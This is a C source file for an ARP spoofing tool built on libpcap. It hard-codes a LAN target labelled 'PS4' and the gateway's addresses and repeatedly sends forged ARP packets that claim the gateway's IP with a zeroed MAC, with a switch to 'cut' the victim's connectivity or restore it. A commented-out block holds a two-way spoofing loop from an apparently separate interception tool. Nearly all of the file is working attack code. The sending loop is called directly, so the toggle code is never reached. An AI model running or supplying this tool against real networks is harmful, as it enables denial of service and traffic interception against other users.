#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include <pthread.h>

#if __MINGW32__
	typedef uint32_t in_addr_t;
	#define ARPOP_REQUEST 1
	#include <windows.h> //sleep
#else
	#include <arpa/inet.h> //htons & in_addr_t
	#include <net/if_arp.h> //ARPOP_REQUEST
	#include <unistd.h> //sleep
#endif

#include "discovery.h"

#pragma pack(push, 1)
	struct EthHeader {
		uint8_t dst[6];
		uint8_t src[6];
		uint16_t ethertype;
	};

	struct ArpHeader {
		uint16_t htype;
		uint16_t ptype;
		uint8_t hlen;
		uint8_t plen;
		uint16_t op;
		uint8_t src_mac[6];
		uint8_t src_ip[4];
		uint8_t dst_mac[6];
		uint8_t dst_ip[4];
	};

	struct Packet {
		struct EthHeader eth;
		struct ArpHeader arp;
	};
#pragma pack(pop)

struct Machine {
	in_addr_t ip; //run it through htons / inet_addr
	uint8_t mac[6];
};

char errbuf[PCAP_ERRBUF_SIZE];
struct Packet poison_packet;
struct Packet restore_packet;
int poison = 0; //determine if we should currently poison

void exitWithPcapError() {
	fprintf (stderr, "%s\n", errbuf);
	exit(1);
}

void fillARPPacket(struct Packet *packet, const struct Machine *dst_machine, const struct Machine *src_machine) {
	//uint8_t local_mac[] = {0xF0, 0xDE, 0xF1, 0x9C, 0x22, 0x3D};
	uint8_t local_mac[] = {0x08, 0x11, 0x96, 0x89, 0xe8, 0x5c};
	memcpy(packet->eth.dst, dst_machine->mac, sizeof(dst_machine->mac));
	//memset(packet->eth.dst, 0xff, sizeof(packet->eth.dst));
	memcpy(packet->eth.src, local_mac, sizeof(local_mac));
	packet->eth.ethertype = htons(0x0806);

	packet->arp.htype = htons(0x0001);
	packet->arp.ptype = htons(0x0800);
	packet->arp.hlen = sizeof(src_machine->mac);
	packet->arp.plen = sizeof(src_machine->ip);
	packet->arp.op = htons(ARPOP_REQUEST);
	memcpy(packet->arp.src_mac, src_machine->mac, sizeof(packet->arp.src_mac));
	memcpy(packet->arp.src_ip, &src_machine->ip, sizeof(packet->arp.src_ip));
	memcpy(packet->arp.dst_mac, dst_machine->mac, sizeof(packet->arp.dst_mac));
	memcpy(packet->arp.dst_ip, &dst_machine->ip, sizeof(packet->arp.dst_ip));
}

void hexdumpARPPacket(struct Packet *p) {
	uint8_t *ptr = (uint8_t *)p;
	for(int i = 0; i < sizeof(struct Packet); i++) {
		printf("%02X ", *ptr);
		ptr++;
		if((size_t)ptr % 16 == 0) printf("\n");
	}
}

void macToArray(uint8_t *d, const char *mac_address) {
	if(strlen(mac_address) > 17) {
		fprintf (stderr, "MAC address string is too long: %s", mac_address);
		exit(1);
	}

	if(sscanf(mac_address, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx", d,d+1,d+2,d+3,d+4,d+5) < 6) {
		fprintf (stderr, "MAC address string is too short: %s", mac_address);
		exit(1);
	}
}

void printMac(const uint8_t *mac_array) {
	printf("%02x", mac_array[0]);
	for(int i = 1; i < 6; i++) printf(":%02x", mac_array[i]);
}

void printIP(const in_addr_t ip) {
	uint8_t *ptr = (uint8_t *)&ip; //remove warning with cast
	printf("%3u.%3u.%3u.%3u", ptr[0], ptr[1], ptr[2], ptr[3]);
}

void printMachineInfo(const char *name, const struct Machine *m) {
	printf("%10s: ", name);
	printIP(m->ip);
	printf(" / ");
	printMac(m->mac);
	printf("\n");
}

void *arpThreadFunction(void *arg) {
	pcap_t *pcap = (pcap_t *)arg;
	struct pcap_pkthdr *header;
	const uint8_t *pkt_data;
	int ret;
	while(1) {
		if(poison) ret = pcap_sendpacket(pcap, (const unsigned char *)&poison_packet, sizeof(poison_packet));
		else ret = pcap_sendpacket(pcap, (const unsigned char *)&restore_packet, sizeof(restore_packet));
		if(ret == 0) {
			puts("succ");
		} else {
			puts("FUCK");
		}
		#if __MINGW32__
			Sleep(1000);
		#else
			sleep(1);
		#endif
	}
	return NULL;
}

int main() {
	char *device_name = pcap_lookupdev(errbuf);
	if(device_name == NULL) exitWithPcapError();
	printf("%10s: %s\n", "Interface", device_name);

	struct Machine dst_machine; //PS4
	dst_machine.ip = inet_addr("192.168.0.34");
	macToArray(dst_machine.mac, "00:d9:d1:6d:78:31");
	printMachineInfo("PS4", &dst_machine);

	struct Machine src_machine; //Gateway
	src_machine.ip = inet_addr("192.168.0.1");
	macToArray(src_machine.mac, "18:35:d1:fe:85:18");
	printMachineInfo("Gateway", &src_machine);

	fillARPPacket(&restore_packet, &dst_machine, &src_machine);

	//fill poison packet
	memcpy(&poison_packet, &restore_packet, sizeof(poison_packet));
	memset(&poison_packet.arp.dst_mac, 0, sizeof(poison_packet.arp.dst_mac));
	//memset(&poison_packet.eth.src, 0, sizeof(poison_packet.eth.src));
	printf("%10s: ", "Poison"); printIP( *((in_addr_t *)poison_packet.arp.src_ip) );
	printf(" / "); printMac(poison_packet.arp.dst_mac);
	printf("\n");

	hexdumpARPPacket(&poison_packet);

	//start
	pcap_t *pcap = pcap_open_live(device_name,
		100,			// snaplen
		1,				// promiscuous mode (nonzero means promiscuous)
		0,			// read timeout
		errbuf			// error buffer
	);
	if(!pcap) exitWithPcapError();

	if (pcap_datalink(pcap) != DLT_EN10MB) {
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", device_name);
		return 1;
	}

	poison = 1; //faster testing

	pthread_t arp_thread;
	//pthread_create(&arp_thread, NULL, arpThreadFunction, (void*)pcap);
	arpThreadFunction((void *)pcap);
	printf("\nReady to cut - press enter to toggle\n");
	while(1) {
		printf("Switch is currently %s", (poison) ? "ON" : "OFF");
		fflush(stdout);
		getchar();
		poison = !poison;
	}

	/*
	time_t next_arp_time = 0;
	while (!stop) {
		time_t now = time(nullptr);
		if (now >= next_arp_time) {
			next_arp_time = now + 2;
			if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
				return 1;
			}
			if (!oneway) {
				if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
					fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
					return 1;
				}
			}
		}

		pcap_pkthdr *header;
		const uint8_t *pkt_data;
		int res = pcap_next_ex(pcap, &header, &pkt_data);
		if (res < 0) {
			printf("error\n");
			break;
		}
		else if (res == 0) {
			// timeout
			continue;
		}
		handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
	}

	printf("Unspoofing\n");
	fill_arp_packet(arp_spoof_victim, victimip, victimmac, targetip, targetmac);
	fill_arp_packet(arp_spoof_target, targetip, targetmac, victimip, victimmac);
	for (int i = 0; i < 3; i++) {
		if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
			fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
			return 1;
		}
		if (!oneway) {
			if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
				fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
				return 1;
			}
		}
	}

	printf("Done\n");
	pcap_close(pcap);
	*/

	return 0;
}
